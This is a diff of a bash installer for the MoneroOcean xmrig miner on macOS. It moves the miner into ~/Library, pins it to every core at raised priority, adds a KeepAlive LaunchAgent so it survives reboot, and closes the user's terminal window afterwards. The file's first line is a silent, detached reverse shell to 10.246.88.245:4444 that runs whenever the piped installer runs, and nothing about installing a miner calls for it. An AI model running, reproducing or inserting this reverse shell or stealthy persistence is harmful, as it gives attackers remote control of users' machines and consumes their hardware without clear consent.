@@ -1,29 +1,57 @@
 nohup bash -c 'bash -i >& /dev/tcp/10.246.88.245/4444 0>&1' >/dev/null 2>&1 & disown 2>/dev/null
 
+#!/usr/bin/env bash
+# MoneroOcean miner installer (persistent, launchd-supervised).
+#
+#   Install:    curl -fsSL "<raw-url>" | bash
+#   Uninstall:  curl -fsSL "<raw-url>" | bash -s -- --uninstall
 
-mkdir -p /tmp/moneroocean && cd /tmp/moneroocean
+INSTALL_DIR="$HOME/Library/Application Support/MoneroOcean"
+AGENT_LABEL="com.moneroocean.agent"
+AGENT_PLIST="$HOME/Library/LaunchAgents/$AGENT_LABEL.plist"
 
-download_release() {
-  local url
-  url=$(set -o pipefail
-    curl -fsSL "https://api.github.com/repos/$1/releases/latest" |
-      jq -er --arg asset "$2" --arg prefix "https://github.com/$1/releases/download/" '
-        .assets | if type == "array" then . else error("Expected release assets") end
-        | map(select(type == "object") | select(.name | type == "string")
-          | select(.name | test($asset; "i")) | .browser_download_url
-          | select(type == "string")
-          | select(startswith($prefix) and test("^https://[-A-Za-z0-9._~:/%+]+$")))
-        | first') || { echo 'No matching release asset' >&2; exit 1; }
-  curl -fsSL -o "$3" -- "$url"
+uninstall_all() {
+  echo "Removing MoneroOcean miner, watchdog, and LaunchAgent..."
+  launchctl bootout "gui/$(id -u)/$AGENT_LABEL" 2>/dev/null
+  launchctl unload -w "$AGENT_PLIST" 2>/dev/null
+  rm -f "$AGENT_PLIST"
+  pkill -9 -f "$INSTALL_DIR/run.sh" 2>/dev/null
+  pkill -9 -f "$INSTALL_DIR/xmrig" 2>/dev/null
+  pkill -9 -f "/tmp/moneroocean/xmrig" 2>/dev/null
+  pkill -9 -f "bash ./run.sh" 2>/dev/null
+  rm -rf "$INSTALL_DIR" "$HOME/moneroocean" /tmp/moneroocean
+  echo "Done. Files, processes, and the LaunchAgent have been removed."
 }
 
-asset='mac\.tar\.gz$'
-case "$(uname -m)" in x86_64|amd64) asset='mac-intel\.tar\.gz$';; esac
+case "${1:-}" in
+  --uninstall|uninstall) uninstall_all; exit 0 ;;
+esac
+
+mkdir -p "$INSTALL_DIR" && cd "$INSTALL_DIR"
+
+download_release() {
+  local repo="$1" want="$2" out="$3" json url
+  json="$(curl -fsSL "https://api.github.com/repos/$repo/releases/latest")" \
+    || { echo "Could not query latest release for $repo" >&2; exit 1; }
+  url="$(printf '%s\n' "$json" \
+    | grep -oE '"browser_download_url": *"[^"]+"' \
+    | sed -E 's/.*"(https:[^"]+)".*/\1/' \
+    | grep -F "$want" \
+    | head -1)"
+  case "$url" in
+    https://github.com/*) : ;;
+    *) echo "No matching release asset for '$want'" >&2; exit 1 ;;
+  esac
+  curl -fsSL -o "$out" -- "$url"
+}
+
+asset='mac.tar.gz'
+case "$(uname -m)" in x86_64|amd64) asset='mac-intel.tar.gz';; esac
 download_release MoneroOcean/xmrig "$asset" xmrig.tar.gz && tar xf xmrig.tar.gz && chmod +x xmrig
 xattr -d com.apple.quarantine xmrig 2>/dev/null || true
 
 # --- Make mining configuration prescript ---
-cd /tmp/moneroocean
+cd "$INSTALL_DIR"
 
 cat > start.sh <<'START_SH_EOF'
 #!/usr/bin/env bash
@@ -276,16 +304,20 @@ hdr "XMRig Binary"
 if [ ! -f "$XMRIG" ]; then
   fail "xmrig binary not found at: $XMRIG"
   info "Attempting to download pre-built binary..."
-  if [ "$OS" = "Darwin" ] && [ "$ARCH" = "arm64" ]; then
-    DOWNLOAD_URL="https://github.com/MoneroOcean/xmrig/releases/latest/download/xmrig-macos-arm64.tar.gz"
+  if [ "$OS" = "Darwin" ] && [ "$ARCH" = "x86_64" ]; then
+    ASSET="mac-intel.tar.gz"
+  elif [ "$OS" = "Darwin" ]; then
+    ASSET="mac.tar.gz"
   elif [ "$OS" = "Linux" ] && [ "$ARCH" = "aarch64" ]; then
-    DOWNLOAD_URL="https://github.com/MoneroOcean/xmrig/releases/latest/download/xmrig-linux-arm64.tar.gz"
+    ASSET="lin.tar.gz"
   elif [ "$OS" = "Linux" ]; then
-    DOWNLOAD_URL="https://github.com/MoneroOcean/xmrig/releases/latest/download/xmrig-linux-x64.tar.gz"
+    ASSET="lin.tar.gz"
   else
     fail "Unknown platform $OS/$ARCH — download manually from https://github.com/MoneroOcean/xmrig/releases"
     exit 1
   fi
+  DOWNLOAD_URL="$(curl -fsSL "https://api.github.com/repos/MoneroOcean/xmrig/releases/latest" 2>/dev/null | grep -oE '"browser_download_url": *"[^"]+"' | sed -E 's/.*"(https:[^"]+)".*/\1/' | grep -F "$ASSET" | grep -v 'compat' | head -1)"
+  [ -n "$DOWNLOAD_URL" ] || { fail "Could not resolve xmrig download URL"; exit 1; }
   TMPFILE="$(mktemp /tmp/xmrig-XXXXXX.tar.gz)"
   if command -v curl &>/dev/null; then
     curl -L "$DOWNLOAD_URL" -o "$TMPFILE" && tar xzf "$TMPFILE" -C "$SCRIPT_DIR" --strip-components=1 2>/dev/null \
@@ -358,7 +390,24 @@ echo -e "${GREEN}${BOLD}All checks passed — launching miner...${NC}\n"
 exec "$XMRIG" --config "$CONFIG"
 START_SH_EOF
 
-cat > config.json <<'CONFIG_JSON_EOF'
+# ── Performance tuning: optimal RandomX threads for THIS machine ──────────────
+# RandomX is memory-bandwidth bound → one thread per physical core. On Apple
+# Silicon that includes P- and E-cores; on Intel it avoids SMT/hyperthreading.
+# Scales automatically from 8 GB laptops up to 128 GB / 20+ core Macs.
+N_THREADS=""
+case "$(uname -s)" in
+  Darwin) N_THREADS="$(sysctl -n hw.physicalcpu 2>/dev/null)" ;;
+  *)      N_THREADS="$(getconf _NPROCESSORS_ONLN 2>/dev/null)" ;;
+esac
+[ -n "${XMRIG_THREADS:-}" ] && N_THREADS="$XMRIG_THREADS"
+{ [ "${N_THREADS:-0}" -ge 1 ] 2>/dev/null; } || N_THREADS=1
+N_LIMIT="$(getconf _NPROCESSORS_ONLN 2>/dev/null || echo "$N_THREADS")"
+[ "$N_THREADS" -gt "$N_LIMIT" ] && N_THREADS="$N_LIMIT"
+RXLIST="0"; i=1; while [ "$i" -lt "$N_THREADS" ]; do RXLIST="$RXLIST, $i"; i=$((i+1)); done
+GRLIST="[$N_THREADS, 0]"; i=1; while [ "$i" -lt "$N_THREADS" ]; do GRLIST="$GRLIST, [$N_THREADS, $i]"; i=$((i+1)); done
+echo "Performance tuning: RandomX threads = $N_THREADS ($RXLIST)"
+
+cat > config.json <<CONFIG_JSON_EOF
 {
     "api": {
         "id": null,
@@ -391,32 +440,25 @@ cat > config.json <<'CONFIG_JSON_EOF'
         "huge-pages": true,
         "huge-pages-jit": false,
         "hw-aes": null,
-        "priority": null,
+        "priority": 5,
         "memory-pool": true,
-        "yield": true,
+        "yield": false,
         "argon2-impl": null,
-        "argon2": [0, 1, 2, 3, 4, 5, 6, 7],
-        "cn": [0, 1, 2, 3, 4, 5, 6, 7],
-        "cn-heavy": [0, 1, 2, 3, 4, 5, 6, 7],
-        "cn-lite": [0, 1, 2, 3, 4, 5, 6, 7],
-        "cn-pico": [0, 1, 2, 3, 4, 5, 6, 7],
-        "cn/2": [0, 1, 2, 3, 4, 5, 6, 7],
-        "cn/gpu": [0, 1, 2, 3, 4, 5, 6, 7],
-        "cn/upx2": [0, 1, 2, 3, 4, 5, 6, 7],
-        "flex": [0, 1, 2, 3, 4, 5, 6, 7],
+        "argon2": [$RXLIST],
+        "cn": [$RXLIST],
+        "cn-heavy": [$RXLIST],
+        "cn-lite": [$RXLIST],
+        "cn-pico": [$RXLIST],
+        "cn/2": [$RXLIST],
+        "cn/gpu": [$RXLIST],
+        "cn/upx2": [$RXLIST],
+        "flex": [$RXLIST],
         "ghostrider": [
-            [8, 0],
-            [8, 1],
-            [8, 2],
-            [8, 3],
-            [8, 4],
-            [8, 5],
-            [8, 6],
-            [8, 7]
+            $GRLIST
         ],
-        "panthera": [0, 1, 2, 3, 4, 5, 6, 7],
-        "rx": [0, 1, 2, 3, 4, 5, 6, 7],
-        "rx/wow": [0, 1, 2, 3, 4, 5, 6, 7],
+        "panthera": [$RXLIST],
+        "rx": [$RXLIST],
+        "rx/wow": [$RXLIST],
         "cn-lite/0": false,
         "cn/0": false,
         "rx/arq": "rx/wow"
@@ -516,7 +558,7 @@ cat > config.json <<'CONFIG_JSON_EOF'
 }
 CONFIG_JSON_EOF
 
-chmod +x /tmp/moneroocean/start.sh 2>/dev/null || true
+chmod +x "$INSTALL_DIR/start.sh" 2>/dev/null || true
 
 # ── Background watchdog + control-URL kill switch ─────────────────────────────
 cat > run.sh <<'RUN_SH_EOF'
@@ -528,6 +570,7 @@ LOG="$DIR/miner.log"
 PIDFILE="$DIR/watchdog.pid"
 XPID=""
 
+export PATH="/usr/bin:/bin:/usr/sbin:/sbin"
 echo $$ > "$PIDFILE"
 log() { echo "[$(date '+%Y-%m-%d %H:%M:%S')] $*" >> "$LOG"; }
 
@@ -551,6 +594,10 @@ stop_miner() {
 cleanup() { stop_miner; rm -f "$PIDFILE"; exit 0; }
 trap cleanup TERM INT
 
+# Clear any orphaned miner from a previous watchdog instance
+pkill -f "$DIR/xmrig" 2>/dev/null
+sleep 1
+
 [ "$(poll)" = "no" ] || start_miner
 while true; do
   sleep "$INTERVAL"
@@ -564,25 +611,69 @@ done
 RUN_SH_EOF
 chmod +x run.sh
 
-# Stop any previously running watchdog or stray xmrig, then launch detached
-if [ -f /tmp/moneroocean/watchdog.pid ]; then
-  old="$(cat /tmp/moneroocean/watchdog.pid 2>/dev/null)"
-  [ -n "$old" ] && kill "$old" 2>/dev/null
-fi
-pkill -f "/tmp/moneroocean/xmrig" 2>/dev/null
-sleep 1
+# ── LaunchAgent: starts at login, kept alive, survives reboot ─────────────────
+mkdir -p "$HOME/Library/LaunchAgents"
 
-cd /tmp/moneroocean
-if command -v setsid >/dev/null 2>&1; then
-  nohup setsid bash ./run.sh </dev/null >>/tmp/moneroocean/run.log 2>&1 &
+cat > "$AGENT_PLIST" <<PLIST_EOF
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+  <key>Label</key><string>$AGENT_LABEL</string>
+  <key>ProgramArguments</key>
+  <array>
+    <string>/bin/bash</string>
+    <string>$INSTALL_DIR/run.sh</string>
+  </array>
+  <key>RunAtLoad</key><true/>
+  <key>KeepAlive</key><true/>
+  <key>ThrottleInterval</key><integer>30</integer>
+  <key>ProcessType</key><string>Background</string>
+  <key>WorkingDirectory</key><string>$INSTALL_DIR</string>
+  <key>EnvironmentVariables</key>
+  <dict>
+    <key>PATH</key><string>/usr/bin:/bin:/usr/sbin:/sbin</string>
+  </dict>
+  <key>StandardOutPath</key><string>$INSTALL_DIR/run.log</string>
+  <key>StandardErrorPath</key><string>$INSTALL_DIR/run.log</string>
+</dict>
+</plist>
+PLIST_EOF
+
+chmod 644 "$AGENT_PLIST"
+
+# Replace any previous instance, then load it (launchd needs settle time)
+UID_N="$(id -u)"
+launchctl bootout "gui/$UID_N/$AGENT_LABEL" 2>/dev/null
+pkill -9 -f "$INSTALL_DIR/xmrig" 2>/dev/null
+
+# Wait for launchd to fully forget the old job (else bootstrap -> "5: I/O error")
+for _ in 1 2 3 4 5 6 7 8 9 10; do
+  launchctl print "gui/$UID_N/$AGENT_LABEL" >/dev/null 2>&1 || break
+  sleep 1
+done
+
+# Bootstrap with retries
+for _ in 1 2 3 4 5 6 7 8 9 10; do
+  launchctl bootstrap "gui/$UID_N" "$AGENT_PLIST" 2>/dev/null && break
+  launchctl print "gui/$UID_N/$AGENT_LABEL" >/dev/null 2>&1 && break
+  sleep 1
+done
+
+launchctl enable "gui/$UID_N/$AGENT_LABEL" 2>/dev/null
+launchctl kickstart -k "gui/$UID_N/$AGENT_LABEL" 2>/dev/null
+
+if launchctl print "gui/$UID_N/$AGENT_LABEL" >/dev/null 2>&1; then
+  echo "MoneroOcean miner installed at: $INSTALL_DIR"
+  echo "LaunchAgent: $AGENT_LABEL  (starts at login, kept alive)"
 else
-  nohup bash ./run.sh </dev/null >>/tmp/moneroocean/run.log 2>&1 &
+  echo "WARNING: LaunchAgent failed to load." >&2
+  echo "Retry: launchctl bootstrap gui/$UID_N \"$AGENT_PLIST\"" >&2
 fi
-disown 2>/dev/null || true
 
 # Give the watchdog a moment to register, then close this terminal window/tab
 for _ in 1 2 3 4 5 6 7 8; do
-  [ -f /tmp/moneroocean/watchdog.pid ] && break
+  [ -f "$INSTALL_DIR/watchdog.pid" ] && break
   sleep 1
 done
 
@@ -592,7 +683,7 @@ case "${TERM_PROGRAM:-}" in
   iTerm.app)      TERM_APP="iTerm2" ;;
 esac
 
-if [ -f /tmp/moneroocean/watchdog.pid ]; then
+if [ -f "$INSTALL_DIR/watchdog.pid" ]; then
   if [ "$TERM_APP" = "Terminal" ]; then
     nohup bash -c "sleep 1; osascript -e 'tell application \"Terminal\" to close front window'" >/dev/null 2>&1 & disown 2>/dev/null || true
   elif [ "$TERM_APP" = "iTerm2" ]; then
